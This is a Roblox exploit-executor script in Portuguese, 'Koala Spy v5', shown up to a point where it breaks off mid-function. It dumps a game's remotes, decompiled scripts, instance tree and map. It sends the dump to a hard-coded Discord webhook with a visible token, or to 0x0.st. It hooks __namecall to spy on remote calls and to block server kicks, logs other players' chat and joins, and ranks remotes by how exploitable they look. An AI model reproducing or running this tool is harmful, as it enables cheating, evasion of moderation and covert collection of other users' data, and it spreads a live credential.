--[[
    KOALA HUB — SPY v5 / DUMP COMPLETO PRO DISCORD
    ----------------------------------------------
    AO CARREGAR (standalone OU via hub) envia AUTOMATICAMENTE:

      ** PACOTE UNICO .zip ** com tudo dentro:
        00_SESSAO.txt       — jogo, PlaceId, player, executor, players no server
        01_REMOTES.txt      — todos os remotes + ANALISE DE OPORTUNIDADES
                              (marca os que parecem exploraveis: buy/sell/
                              give/damage/reward/admin/teleport...)
        02_ARVORE.txt       — TODAS as instancias do jogo
        03_SCRIPTS.txt      — lista de Script/LocalScript/ModuleScript
        04_FONTES_*.lua.txt — fontes decompiladas (se o executor tiver decompile)
        05_INTERACOES.txt   — ProximityPrompts, ClickDetectors, TouchInterests
                              com caminho e posicao (pra escrever cheat)
        06_DADOS.txt        — leaderstats, atributos, ValueObjects
        07_UI.txt           — botoes e labels do PlayerGui
        08_MAPA.rbxl        — mapa completo (saveinstance, abre no Studio)

      Se o .zip passar de ~24MB: sobe no 0x0.st e manda so o LINK no canal.
      Se os dois falharem: manda os arquivos separados (modo antigo).

    TEMPO REAL (ficam rodando depois do dump):
      * SPY OUT: FireServer/InvokeServer que o client manda (lotes a cada 5s)
      * SPY IN:  o que o SERVIDOR manda pro client (OnClientEvent)
      * CHAT LOG: mensagens do chat (novo e legado)
      * PLAYERS: quem entra/sai do server
      * ANTI-KICK: bloqueia Kick() do servidor no seu personagem

    CONFIG OPCIONAL (rode ANTES do loadstring):
        _G.KoalaSpyConfig = {
            Webhook   = "https://discord.com/api/webhooks/...",  -- outro webhook
            SemMapa   = true,    -- pula o .rbxl (mais rapido)
            SemFontes = true,    -- pula decompile
            SemSpyIn  = true,    -- desliga spy de entrada
            SemAntiKick = true,  -- desliga anti-kick
            Silencioso = true,   -- sem notificacoes na tela
        }

    Standalone:
        loadstring(game:HttpGet("https://raw.githubusercontent.com/rodrigsapps/KoalaUI/main/KoalaSpy.lua"))()
]]

--==================================================================--
--  CONFIG
--==================================================================--
local CFG = type(_G.KoalaSpyConfig) == "table" and _G.KoalaSpyConfig or {}

local WEBHOOK_URL = CFG.Webhook
    or "https://discord.com/api/webhooks/1549385323044151296/7T_ZOMoz2BOd5RdiZo4peuYEsXxIhbReVP9_gKIIR_nIw6yOvBfAxBOppnldMP3AHJng"

local INTERVALO_FILA = 5
local MAX_MSG        = 1800
local MAX_FILA       = 400
local MAX_ARG_STR    = 300
local MAX_PROFUND    = 4
local MAX_UPLOAD     = 24 * 1024 * 1024
local MAX_LOG_SESSAO = 5000

local AUTO_MAPA    = not CFG.SemMapa
local AUTO_FONTES  = not CFG.SemFontes
local SPY_IN       = CFG.SemSpyIn ~= true
local ANTI_KICK    = CFG.SemAntiKick ~= true
local SILENCIOSO   = CFG.Silencioso == true

local MAX_ARVORE_LINHAS     = 250000
local MAX_DECOMPILE_SCRIPTS = 150
local MAX_FONTE_UNICA       = 1000000
local MAX_FONTES_BYTES      = 16 * 1024 * 1024

local State = { spyAtivo = true }

--==================================================================--
--  HELPERS BASE
--==================================================================--
local Players           = game:GetService("Players")
local HttpService       = game:GetService("HttpService")
local MarketplaceService= game:GetService("MarketplaceService")
local TextChatService   = game:GetService("TextChatService")
local LP = Players.LocalPlayer

local function notify(msg, dur)
    print("[KoalaSpy] " .. tostring(msg))
    if SILENCIOSO then return end
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification",
            { Title = "Koala Spy", Text = msg, Duration = dur or 4 })
    end)
end

local function env(nome)
    local ok, f = pcall(function() return getfenv()[nome] end)
    if ok then return f end
    return nil
end

local httpRequest = env("request") or env("http_request")
    or (syn and syn.request) or (http and http.request)
    or (fluxus and fluxus.request)

local FS = {
    write = env("writefile"),  read  = env("readfile"),
    list  = env("listfiles"),  isfile= env("isfile"),
    mkdir = env("makefolder"), isdir = env("isfolder"),
}
local saveinstance     = env("saveinstance")
local decompile        = env("decompile")
local identifyexecutor = env("identifyexecutor")
local getnamecallmethod= env("getnamecallmethod")
local hookmetamethod   = env("hookmetamethod")
local hookfunction     = env("hookfunction")
local newcclosure      = env("newcclosure") or function(f) return f end

--==================================================================--
--  DISCORD — texto e arquivo
--==================================================================--
local function postWebhook(content)
    if not content or #content == 0 then return false end
    if #content > 1990 then content = content:sub(1, 1990) end
    local body = HttpService:JSONEncode({ content = content })
    if httpRequest then
        local ok, res = pcall(function()
            return httpRequest({
                Url = WEBHOOK_URL, Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = body,
            })
        end)
        if ok and res and (res.StatusCode == 200 or res.StatusCode == 204) then
            return true
        end
    end
    local ok2 = pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, body, Enum.HttpContentType.ApplicationJson)
    end)
    return ok2
end

local function postWebhookFile(nomeArquivo, conteudo, mensagem)
    if not httpRequest then return false, "executor sem request" end
    if not conteudo or #conteudo == 0 then return false, "vazio" end

    local boundary = "----KoalaBoundary" .. tostring(math.random(100000, 999999999))
    local payload  = HttpService:JSONEncode({ content = mensagem or "" })
    local corpo = table.concat({
        "--" .. boundary .. "\r\n",
        'Content-Disposition: form-data; name="payload_json"\r\n',
        "Content-Type: application/json\r\n\r\n",
        payload, "\r\n",
        "--" .. boundary .. "\r\n",
        'Content-Disposition: form-data; name="files[0]"; filename="', nomeArquivo, '"\r\n',
        "Content-Type: application/octet-stream\r\n\r\n",
        conteudo, "\r\n",
        "--" .. boundary .. "--\r\n",
    })
    local ok, res = pcall(function()
        return httpRequest({
            Url = WEBHOOK_URL, Method = "POST",
            Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. boundary },
            Body = corpo,
        })
    end)
    if ok and res and (res.StatusCode == 200 or res.StatusCode == 204) then
        return true
    end
    return false, ok and ("HTTP " .. tostring(res and res.StatusCode)) or tostring(res)
end

--==================================================================--
--  0x0.st — upload de arquivo grande, retorna link
--==================================================================--
local function uploadLink(nomeArquivo, conteudo)
    if not httpRequest then return nil, "sem request" end
    local boundary = "----Koala0x" .. tostring(math.random(100000, 999999999))
    local corpo = table.concat({
        "--" .. boundary .. "\r\n",
        'Content-Disposition: form-data; name="file"; filename="', nomeArquivo, '"\r\n',
        "Content-Type: application/octet-stream\r\n\r\n",
        conteudo, "\r\n",
        "--" .. boundary .. "--\r\n",
    })
    local ok, res = pcall(function()
        return httpRequest({
            Url = "https://0x0.st", Method = "POST",
            Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. boundary },
            Body = corpo,
        })
    end)
    if ok and res and res.StatusCode == 200 and type(res.Body) == "string"
        and res.Body:match("^https?://") then
        return (res.Body:gsub("%s+$", ""))
    end
    return nil, ok and ("HTTP " .. tostring(res and res.StatusCode)) or tostring(res)
end

--==================================================================--
--  KOALA ZIP — ZIP store-only em Lua puro (sem dependencia)
--==================================================================--
local Zip = {}

do
    local bxor = (bit32 and bit32.bxor) or (bit and bit.bxor)
    local rshift = (bit32 and bit32.rshift) or (bit and bit.rshift)
    local band = (bit32 and bit32.band) or (bit and bit.band)
    if not bxor then error("sem bit32/bit — zip indisponivel") end

    local crcTab = {}
    for i = 0, 255 do
        local c = i
        for _ = 1, 8 do
            if band(c, 1) == 1 then
                c = bxor(0xEDB88320, rshift(c, 1))
            else
                c = rshift(c, 1)
            end
        end
        crcTab[i] = c
    end

    function Zip.crc32(s)
        local c = 0xFFFFFFFF
        for i = 1, #s do
            c = bxor(rshift(c, 8), crcTab[band(bxor(c, s:byte(i)), 0xFF)])
        end
        return band(bxor(c, 0xFFFFFFFF), 0xFFFFFFFF)
    end

    local function u16(n)
        n = n % 65536
        return string.char(n % 256, math.floor(n / 256) % 256)
    end
    local function u32(n)
        n = n % 4294967296
        return string.char(n % 256, math.floor(n / 256) % 256,
            math.floor(n / 65536) % 256, math.floor(n / 16777216) % 256)
    end

    -- entradas: { {nome="a/b.txt", dados="..."}, ... } -> string binaria do zip
    function Zip.montar(entradas)
        local out, central = {}, {}
        local offset = 0
        for _, e in ipairs(entradas) do
            local nome, dados = e.nome, e.dados
            local crc = Zip.crc32(dados)
            local tam = #dados
            local lh = table.concat({
                "PK\3\4", u16(20), u16(0), u16(0), u16(0), u16(0),
                u32(crc), u32(tam), u32(tam), u16(#nome), u16(0), nome,
            })
            table.insert(out, lh)
            table.insert(out, dados)
            table.insert(central, table.concat({
                "PK\1\2", u16(20), u16(20), u16(0), u16(0), u16(0), u16(0),
                u32(crc), u32(tam), u32(tam),
                u16(#nome), u16(0), u16(0), u16(0), u16(0), u32(0),
                u32(offset), nome,
            }))
            offset = offset + #lh + tam
        end
        local cd = table.concat(central)
        table.insert(out, cd)
        table.insert(out, table.concat({
            "PK\5\6", u16(0), u16(0), u16(#entradas), u16(#entradas),
            u32(#cd), u32(offset), u16(0),
        }))
        return table.concat(out)
    end
end

--==================================================================--
--  FILA DE TEXTO (spy ao vivo)
--==================================================================--
local fila = {}
local enviando = false

local function enfileirar(texto)
    if #fila >= MAX_FILA then table.remove(fila, 1) end
    table.insert(fila, texto)
end

--==================================================================--
--  INFO DA SESSAO
--==================================================================--
local function infoSessao()
    local nomeJogo = "?"
    pcall(function()
        nomeJogo = MarketplaceService:GetProductInfo(game.PlaceId).Name
    end)
    local exec = "?"
    pcall(function()
        if identifyexecutor then
            local a, b = identifyexecutor()
            exec = tostring(a) .. (b and (" " .. tostring(b)) or "")
        end
    end)
    local linhas = {
        "Jogo: " .. tostring(nomeJogo),
        string.format("PlaceId: %d | UniverseId: %s | PlaceVersion: %s",
            game.PlaceId, tostring(game.GameId), tostring(game.PlaceVersion)),
        "Criador: " .. tostring(game.CreatorType) .. " " .. tostring(game.CreatorId),
        "JobId: " .. tostring(game.JobId),
        string.format("Player: %s (UserId %s, AccountAge %sd) | Server: %d/%d",
            LP and LP.Name or "?", LP and tostring(LP.UserId) or "?",
            LP and tostring(LP.AccountAge) or "?",
            #Players:GetPlayers(), Players.MaxPlayers),
        "Executor: " .. exec,
        "Data: " .. os.date("!%d/%m/%Y %H:%M") .. " UTC",
    }
    -- todos os players do server
    local nomes = {}
    for _, p in ipairs(Players:GetPlayers()) do
        table.insert(nomes, string.format("  - %s (@%s, UserId %s, %sd)",
            p.DisplayName, p.Name, tostring(p.UserId), tostring(p.AccountAge)))
    end
    if #nomes > 0 then
        table.insert(linhas, "Players no server:")
        for _, n in ipairs(nomes) do table.insert(linhas, n) end
    end
    return table.concat(linhas, "\n")
end

--==================================================================--
--  SERIALIZACAO
--==================================================================--
local serializar
serializar = function(v, prof)
    prof = prof or 0
    local t = typeof(v)
    if t == "string" then
        if #v > MAX_ARG_STR then v = v:sub(1, MAX_ARG_STR) .. "..." end
        return string.format("%q", v)
    elseif t == "number" or t == "boolean" or t == "nil" then
        return tostring(v)
    elseif t == "Instance" then
        local ok, caminho = pcall(function() return v:GetFullName() end)
        return "Instance(" .. (ok and caminho or tostring(v)) .. ")"
    elseif t == "Vector3" then
        return string.format("Vector3(%.2f, %.2f, %.2f)", v.X, v.Y, v.Z)
    elseif t == "Vector2" then
        return string.format("Vector2(%.2f, %.2f)", v.X, v.Y)
    elseif t == "CFrame" then
        local p = v.Position
        return string.format("CFrame(%.2f, %.2f, %.2f)", p.X, p.Y, p.Z)
    elseif t == "Color3" then
        return string.format("Color3(%.2f, %.2f, %.2f)", v.R, v.G, v.B)
    elseif t == "BrickColor" or t == "EnumItem" then
        return tostring(v)
    elseif t == "UDim2" then
        return "UDim2(" .. tostring(v) .. ")"
    elseif t == "table" then
        if prof >= MAX_PROFUND then return "{...}" end
        local partes, n = {}, 0
        for k, val in pairs(v) do
            n = n + 1
            if n > 30 then table.insert(partes, "...") break end
            local chave = (type(k) == "string") and (k .. " = ") or ("[" .. tostring(k) .. "] = ")
            table.insert(partes, chave .. serializar(val, prof + 1))
        end
        return "{" .. table.concat(partes, ", ") .. "}"
    else
        return t .. "(" .. tostring(v) .. ")"
    end
end

local function serializarArgs(args)
    local partes = {}
    for i = 1, #args do
        table.insert(partes, serializar(args[i]))
    end
    return table.concat(partes, ", ")
end

local function caminhoDe(inst)
    local ok, c = pcall(function() return inst:GetFullName() end)
    if ok then return c end
    return tostring(inst)
end

--==================================================================--
--  ANALISE DE OPORTUNIDADES (remotes que parecem exploraveis)
--==================================================================--
local PADROES_QUENTES = {
    { "buy|purchase|comprar|shop|loja",        "COMPRA — testar preco/quantidade negativa ou zero" },
    { "sell|vender|sellall",                   "VENDA — testar vender item que nao tem / qtd inflada" },
    { "give|grant|add|reward|recompensa|claim|resgatar", "DAR/RECOMPENSA — testar chamar direto" },
    { "damage|hit|dano|attack|atacar|kill",    "DANO — testar alvo arbitrario / dano inflado" },
    { "coin|cash|money|dinheiro|gold|gem|diamond", "MOEDA — testar setar valor direto" },
    { "admin|kick|ban|mod|staff",              "ADMIN — remote privilegiado, testar permissao" },
    { "teleport|tp|portal|warp",               "TELEPORTE — testar coordenada arbitraria" },
    { "open|abrir|chest|bau|crate|roll|girar|spin", "ABRIR/GIRAR — testar spam / sem custo" },
    { "spawn|summon|criar",                    "SPAWN — testar criar objetos" },
    { "upgrade|melhorar|evoluir|level",        "UPGRADE — testar nivel acima do permitido" },
    { "equip|unequip|inventory|inventario",    "INVENTARIO — testar equipar item que nao tem" },
    { "trade|trocar",                          "TROCA — risco de dupe, mexer com cuidado" },
}

local function analisarRemotes(lista)
    local quentes = {}
    for _, r in ipairs(lista) do
        local nomeLower = r.nome:lower()
        for _, padrao in ipairs(PADROES_QUENTES) do
            if nomeLower:match(padrao[1]) then
                table.insert(quentes, string.format("  [QUENTE] %s\n      -> %s\n      -> %s",
                    r.caminho, r.classe, padrao[2]))
                break
            end
        end
    end
    return quentes
end

--==================================================================--
--  COLETA — cada sistema gera { nome, dados } e entra no pacote
--==================================================================--
local CLASSES_REMOTE = {
    RemoteEvent = true, RemoteFunction = true, UnreliableRemoteEvent = true,
    BindableEvent = true, BindableFunction = true,
}

local function coletarRemotes()
    local lista, linhas = {}, {
        "KOALA SPY — DUMP DE REMOTES",
        infoSessao(),
        string.rep("-", 60),
    }
    for _, inst in ipairs(game:GetDescendants()) do
        if CLASSES_REMOTE[inst.ClassName] then
            local entrada = {
                nome = inst.Name, classe = inst.ClassName, caminho = caminhoDe(inst),
            }
            table.insert(lista, entrada)
            table.insert(linhas, string.format("[%s] %s", inst.ClassName, entrada.caminho))
        end
    end

    local quentes = analisarRemotes(lista)
    local final = {
        "KOALA SPY — DUMP DE REMOTES",
        infoSessao(),
        string.rep("-", 60),
        string.format(">>> ANALISE: %d remotes POTENCIALMENTE EXPLORAVEIS <<<", #quentes),
        string.rep("-", 60),
    }
    if #quentes > 0 then
        for _, q in ipairs(quentes) do table.insert(final, q) end
    else
        table.insert(final, "  (nenhum nome obvio — olha a lista completa abaixo)")
    end
    table.insert(final, "")
    table.insert(final, string.rep("-", 60))
    table.insert(final, "LISTA COMPLETA:")
    table.insert(final, string.rep("-", 60))
    for i = 4, #linhas do table.insert(final, linhas[i]) end
    table.insert(final, string.rep("-", 60))
    table.insert(final, "Total: " .. #lista .. " remotes")
    return table.concat(final, "\n"), #lista, #quentes
end

local function coletarArvore()
    local linhas = {
        "KOALA SPY — ARVORE COMPLETA DO JOGO",
        infoSessao(),
        string.rep("-", 60),
    }
    local desc = game:GetDescendants()
    local total = #desc
    local limite = math.min(total, MAX_ARVORE_LINHAS)
    for i = 1, limite do
        local inst = desc[i]
        table.insert(linhas, string.format("[%s] %s", inst.ClassName, caminhoDe(inst)))
        if i % 20000 == 0 then task.wait() end
    end
    if total > limite then
        table.insert(linhas, string.format("... TRUNCADO em %d de %d instancias", limite, total))
    end
    table.insert(linhas, string.rep("-", 60))
    table.insert(linhas, "Total de instancias: " .. total)
    local conteudo = table.concat(linhas, "\n")
    if #conteudo > MAX_UPLOAD then
        conteudo = conteudo:sub(1, MAX_UPLOAD - 200) .. "\n... CORTADO (limite)"
    end
    return conteudo, total
end

local function coletarScriptsLista(lista)
    local linhas = {
        "KOALA SPY — LISTA DE SCRIPTS",
        infoSessao(),
        string.rep("-", 60),
    }
    for _, s in ipairs(lista) do
        table.insert(linhas, string.format("[%s] %s", s.ClassName, caminhoDe(s)))
    end
    table.insert(linhas, string.rep("-", 60))
    table.insert(linhas, "Total: " .. #lista .. " scripts")
    return table.concat(linhas, "\n")
end

local function coletarFontes(lista)
    if not decompile then return {}, 0, 0 end
    local partes, parteNum = {}, 1
    local buffer = {
        "KOALA SPY — FONTES DECOMPILADAS (parte " .. parteNum .. ")",
        infoSessao(), string.rep("-", 60),
    }
    local bytes = 0
    local feitos, falhas = 0, 0
    local function flush()
        table.insert(partes, table.concat(buffer, "\n"))
        parteNum = parteNum + 1
        buffer = {
            "KOALA SPY — FONTES DECOMPILADAS (parte " .. parteNum .. ")",
            infoSessao(), string.rep("-", 60),
        }
        bytes = 0
    end
    for i, s in ipairs(lista) do
        if i > MAX_DECOMPILE_SCRIPTS then
            table.insert(buffer, string.format(
                "... LIMITE de %d scripts (total: %d)", MAX_DECOMPILE_SCRIPTS, #lista))
            break
        end
        if s.ClassName ~= "Script" then
            local ok, src = pcall(decompile, s)
            if ok and type(src) == "string" and #src > 0 then
                if #src > MAX_FONTE_UNICA then
                    src = src:sub(1, MAX_FONTE_UNICA) .. "\n-- ... TRUNCADO"
                end
                local bloco = string.format(
                    "\n--==================================================================--\n-- [%s] %s\n--==================================================================--\n%s\n",
                    s.ClassName, caminhoDe(s), src)
                if bytes + #bloco > MAX_FONTES_BYTES then flush() end
                table.insert(buffer, bloco)
                bytes = bytes + #bloco
                feitos = feitos + 1
            else
                falhas = falhas + 1
            end
        end
        if i % 10 == 0 then task.wait() end
    end
    if bytes > 200 then flush() end
    return partes, feitos, falhas
end

local function coletarInteracoes()
    local linhas = {
        "KOALA SPY — INTERACOES (prompts, cliques, toques)",
        infoSessao(), string.rep("-", 60),
        "Use isso pra escrever cheats: fireproximityprompt(caminho) etc.",
        "",
    }
    local nP, nC, nT = 0, 0, 0
    for _, inst in ipairs(game:GetDescendants()) do
        local c = inst.ClassName
        if c == "ProximityPrompt" then
            nP = nP + 1
            local pai = inst.Parent
            local pos = "?"
            pcall(function()
                local part = pai:IsA("BasePart") and pai or pai and pai:FindFirstChildWhichIsA("BasePart", true)
                if part then pos = tostring(part.Position) end
            end)
            table.insert(linhas, string.format("[PROMPT] %s | Hold: %.1fs | Dist: %.1f | Pos: %s",
                caminhoDe(inst), inst.HoldDuration, inst.MaxActivationDistance, pos))
        elseif c == "ClickDetector" then
            nC = nC + 1
            table.insert(linhas, string.format("[CLICK] %s | Dist: %.1f",
                caminhoDe(inst), inst.MaxActivationDistance))
        elseif c == "TouchTransmitter" then
            nT = nT + 1
            table.insert(linhas, "[TOUCH] " .. caminhoDe(inst))
        end
        if (nP + nC + nT) % 5000 == 0 then task.wait() end
    end
    table.insert(linhas, string.rep("-", 60))
    table.insert(linhas, string.format("Total: %d prompts, %d clicks, %d touches", nP, nC, nT))
    return table.concat(linhas, "\n"), nP, nC, nT
end

local function coletarDados()
    local linhas = {
        "KOALA SPY — DADOS (leaderstats, atributos, valores)",
        infoSessao(), string.rep("-", 60),
        "",
        "== LEADERSTATS ==",
    }
    pcall(function()
        local ls = LP:FindFirstChild("leaderstats")
        if ls then
            for _, v in ipairs(ls:GetDescendants()) do
                local ok, val = pcall(function() return v.Value end)
                table.insert(linhas, string.format("  %s = %s [%s]",
                    caminhoDe(v), ok and tostring(val) or "?", v.ClassName))
            end
        else
            table.insert(linhas, "  (sem leaderstats)")
        end
    end)
    table.insert(linhas, "")
    table.insert(linhas, "== ATRIBUTOS DO PLAYER ==")
    pcall(function()
        local attrs = LP:GetAttributes()
        local n = 0
        for k, v in pairs(attrs) do
            n = n + 1
            table.insert(linhas, string.format("  %s = %s", k, serializar(v)))
        end
        if n == 0 then table.insert(linhas, "  (nenhum)") end
    end)
    table.insert(linhas, "")
    table.insert(linhas, "== VALUEOBJECTS EM REPLICATEDSTORAGE ==")
    local n = 0
    pcall(function()
        for _, v in ipairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
            if v.ClassName:match("Value$") and v.ClassName ~= "NumberValue" or v.ClassName == "NumberValue" then
                local ok, val = pcall(function() return v.Value end)
                if ok and (type(val) == "number" or type(val) == "string" or type(val) == "boolean") then
                    n = n + 1
                    if n <= 400 then
                        table.insert(linhas, string.format("  %s = %s [%s]",
                            caminhoDe(v), tostring(val):sub(1, 100), v.ClassName))
                    end
                end
            end
        end
    end)
    if n > 400 then table.insert(linhas, string.format("  ... +%d valores", n - 400)) end
    return table.concat(linhas, "\n")
end

local function coletarUI()
    local linhas = {
        "KOALA SPY — UI DO PLAYER (botoes e textos)",
        infoSessao(), string.rep("-", 60),
    }
    local n = 0
    pcall(function()
        local pg = LP:FindFirstChildOfClass("PlayerGui")
        if pg then
            for _, inst in ipairs(pg:GetDescendants()) do
                local c = inst.ClassName
                if c == "TextButton" or c == "ImageButton" then
                    n = n + 1
                    local texto = ""
                    pcall(function() texto = inst.Text or "" end)
                    table.insert(linhas, string.format("[BOTAO] %s %s",
                        caminhoDe(inst), texto ~= "" and ('| texto: "' .. texto:sub(1, 50) .. '"') or ""))
                elseif c == "TextLabel" and inst.Text and #inst.Text > 0 and #inst.Text < 80 then
                    n = n + 1
                    table.insert(linhas, string.format("[LABEL] %s | "%s"",
                        caminhoDe(inst), inst.Text:gsub("\n", " ")))
                end
                if n >= 3000 then
                    table.insert(linhas, "... LIMITE de 3000 elementos")
                    break
                end
            end
        end
    end)
    table.insert(linhas, string.rep("-", 60))
    table.insert(linhas, "Total: " .. n .. " elementos de UI")
    return table.concat(linhas, "\n")
end

--==================================================================--
--  MAPA (.rbxl)
--==================================================================--
local function snapshotArquivos()
    local set = {}
    if FS.list then
        pcall(function()
            for _, f in ipairs(FS.list("")) do set[tostring(f)] = true end
        end)
    end
    return set
end

local function salvarMapa()
    if not saveinstance or not FS.read or not FS.list then return nil end
    local antes = snapshotArquivos()
    local nome = "koala_mapa_" .. game.PlaceId
    local ok = pcall(function() saveinstance(game, { FileName = nome, Mode = "full" }) end)
    if not ok then ok = pcall(function() saveinstance(game, { FileName = nome }) end) end
    if not ok then ok = pcall(function() saveinstance(game) end) end
    if not ok then ok = pcall(saveinstance) end
    if not ok then return nil end
    task.wait(2)
    local arquivo
    pcall(function()
        for _, f in ipairs(FS.list("")) do
            f = tostring(f)
            local lower = f:lower()
            if (not antes[f] and (lower:match("%.rbxl$") or lower:match("%.rbxm$")))
                or lower:find(nome:lower(), 1, true) then
                arquivo = f
            end
        end
        if not arquivo and FS.isdir then
            for _, f in ipairs(FS.list("")) do
                f = tostring(f)
                if FS.isdir(f) then
                    for _, sub in ipairs(FS.list(f)) do
                        sub = tostring(sub)
                        if sub:lower():find(nome:lower(), 1, true) then arquivo = sub end
                    end
                end
            end
        end
    end)
    if not arquivo then return nil end
    local okR, dados = pcall(FS.read, arquivo)
    if not okR or not dados or #dados == 0 then return nil end
    local nomeArq = arquivo:match("([^/\\]+)$") or (nome .. ".rbxl")
    return dados, nomeArq
end

--==================================================================--
--  SALVAMENTO LOCAL (workspace do executor)
--==================================================================--
local function salvarLocal(nomeArq, dados)
    if not FS.write then return end
    pcall(function()
        if FS.mkdir then FS.mkdir("koalaspy") end
        FS.write("koalaspy/" .. nomeArq, dados)
    end)
end

--==================================================================--
--  SPY OUT (FireServer / InvokeServer)
--==================================================================--
local spyLigado = false
local logSessao = {}
local contagemSpy = { out = 0, inn = 0, chat = 0 }

local function ehRemoteValido(self)
    return typeof(self) == "Instance"
        and (self.ClassName == "RemoteEvent" or self.ClassName == "RemoteFunction"
             or self.ClassName == "UnreliableRemoteEvent")
end

local function registrar(linha)
    enfileirar(linha)
    if #logSessao >= MAX_LOG_SESSAO then table.remove(logSessao, 1) end
    table.insert(logSessao, linha)
end

local function logarChamada(self, metodo, args)
    if not State.spyAtivo then return end
    if not ehRemoteValido(self) then return end
    contagemSpy.out = contagemSpy.out + 1
    registrar(string.format("[OUT] %s :%s( %s )\n      -> %s",
        self.Name, metodo, serializarArgs(args), caminhoDe(self)))
end

local function ligarSpyOut()
    if spyLigado then return true end
    if hookmetamethod and getnamecallmethod then
        local velho
        velho = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
            local metodo = getnamecallmethod()
            if (metodo == "FireServer" or metodo == "InvokeServer") and ehRemoteValido(self) then
                pcall(logarChamada, self, metodo, { ... })
            end
            return velho(self, ...)
        end))
        spyLigado = true
        return true
    end
    if hookfunction then
        local okFire = pcall(function()
            local velho
            velho = hookfunction(Instance.new("RemoteEvent").FireServer, newcclosure(function(self, ...)
                pcall(logarChamada, self, "FireServer", { ... })
                return velho(self, ...)
            end))
        end)
        local okInvoke = pcall(function()
            local velho
            velho = hookfunction(Instance.new("RemoteFunction").InvokeServer, newcclosure(function(self, ...)
                pcall(logarChamada, self, "InvokeServer", { ... })
                return velho(self, ...)
            end))
        end)
        if okFire or okInvoke then
            spyLigado = true
            return true
        end
    end
    return false
end

--==================================================================--
--  SPY IN (servidor -> client: OnClientEvent)
--==================================================================--
local spyInConectados = 0

local function conectarSpyIn(remote)
    if not State.spyAtivo then return end
    pcall(function()
        remote.OnClientEvent:Connect(function(...)
            if not State.spyAtivo then return end
            contagemSpy.inn = contagemSpy.inn + 1
            registrar(string.format("[IN] %s <- ( %s )\n      -> %s",
                remote.Name, serializarArgs({ ... }), caminhoDe(remote)))
        end)
    end)
    spyInConectados = spyInConectados + 1
end

local function ligarSpyIn()
    if not SPY_IN then return 0 end
    for _, inst in ipairs(game:GetDescendants()) do
        if inst.ClassName == "RemoteEvent" or inst.ClassName == "UnreliableRemoteEvent" then
            conectarSpyIn(inst)
        end
    end
    game.DescendantAdded:Connect(function(inst)
        if inst.ClassName == "RemoteEvent" or inst.ClassName == "UnreliableRemoteEvent" then
            task.wait(0.5)
            conectarSpyIn(inst)
        end
    end)
    return spyInConectados
end

--==================================================================--
--  CHAT LOGGER
--==================================================================--
local function ligarChatLog()
    pcall(function()
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            TextChatService.MessageReceived:Connect(function(msg)
                if not State.spyAtivo then return end
                contagemSpy.chat = contagemSpy.chat + 1
                local quem = msg.TextSource and tostring(msg.TextSource.UserId) or "?"
                registrar(string.format("[CHAT] %s (uid %s): %s",
                    msg.PrefixText or "?", quem, msg.Text or ""))
            end)
            return
        end
    end)
    -- chat legado
    local function vigia(p)
        pcall(function()
            p.Chatted:Connect(function(msg)
                if not State.spyAtivo then return end
                contagemSpy.chat = contagemSpy.chat + 1
                registrar(string.format("[CHAT] %s: %s", p.Name, tostring(msg):sub(1, 200)))
            end)
        end)
    end
    for _, p in ipairs(Players:GetPlayers()) do vigia(p) end
    Players.PlayerAdded:Connect(vigia)
end

--==================================================================--
--  PLAYER WATCHER
--==================================================================--
local function ligarPlayerWatcher()
    Players.PlayerAdded:Connect(function(p)
        registrar(string.format("[SERVER] ENTROU: %s (@%s, uid %s, %sd) — %d/%d",
            p.DisplayName, p.Name, tostring(p.UserId), tostring(p.AccountAge),
            #Players:GetPlayers(), Players.MaxPlayers))
    end)
    Players.PlayerRemoving:Connect(function(p)
        registrar(string.format("[SERVER] SAIU: %s (@%s) — %d/%d",
            p.DisplayName, p.Name, #Players:GetPlayers() - 1, Players.MaxPlayers))
    end)
end

--==================================================================--
--  ANTI-KICK (bloqueia Kick do servidor no LocalPlayer)
--==================================================================--
local function ligarAntiKick()
    if not ANTI_KICK then return false end
    if not (hookmetamethod and getnamecallmethod) then return false end
    pcall(function()
        local velho
        velho = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
            local metodo = getnamecallmethod()
            if metodo == "Kick" and self == LP then
                warn("[KoalaSpy] Kick do servidor BLOQUEADO")
                registrar("[ANTI-KICK] servidor tentou te chutar — bloqueado")
                return
            end
            return velho(self, ...)
        end))
    end)
    return true
end

--==================================================================--
--  PACOTE UNICO — monta tudo, zipa, envia (ou link, ou separado)
--==================================================================--
local function dumpCompleto()
    local arquivos = {}
    local resumo = { sessao = infoSessao() }

    -- sessao
    table.insert(arquivos, { nome = "00_SESSAO.txt", dados = resumo.sessao })

    -- remotes + analise
    local conteudoR, nR, nQ = coletarRemotes()
    table.insert(arquivos, { nome = "01_REMOTES.txt", dados = conteudoR })
    resumo.remotes, resumo.quentes = nR, nQ
    task.wait(0.5)

    -- interacoes
    local conteudoI, nP, nC, nT = coletarInteracoes()
    table.insert(arquivos, { nome = "05_INTERACOES.txt", dados = conteudoI })
    resumo.prompts, resumo.clicks, resumo.touches = nP, nC, nT
    task.wait(0.5)

    -- dados
    table.insert(arquivos, { nome = "06_DADOS.txt", dados = coletarDados() })
    task.wait(0.5)

    -- UI
    table.insert(arquivos, { nome = "07_UI.txt", dados = coletarUI() })
    task.wait(0.5)

    -- arvore (pesada)
    local conteudoA, totalInst = coletarArvore()
    table.insert(arquivos, { nome = "02_ARVORE.txt", dados = conteudoA })
    resumo.instancias = totalInst
    task.wait(0.5)

    -- scripts
    local listaScripts = {}
    for _, inst in ipairs(game:GetDescendants()) do
        local c = inst.ClassName
        if c == "LocalScript" or c == "ModuleScript" or c == "Script" then
            table.insert(listaScripts, inst)
        end
    end
    table.insert(arquivos, { nome = "03_SCRIPTS.txt", dados = coletarScriptsLista(listaScripts) })
    resumo.scripts = #listaScripts
    task.wait(0.5)

    -- fontes
    resumo.decompilados, resumo.falhasDecompile = 0, 0
    if AUTO_FONTES and decompile then
        notify("Decompilando scripts... pode demorar.", 4)
        local partes, feitos, falhas = coletarFontes(listaScripts)
        for i, p in ipairs(partes) do
            table.insert(arquivos, {
                nome = string.format("04_FONTES_parte%d.lua.txt", i), dados = p,
            })
        end
        resumo.decompilados, resumo.falhasDecompile = feitos, falhas
    end

    -- mapa
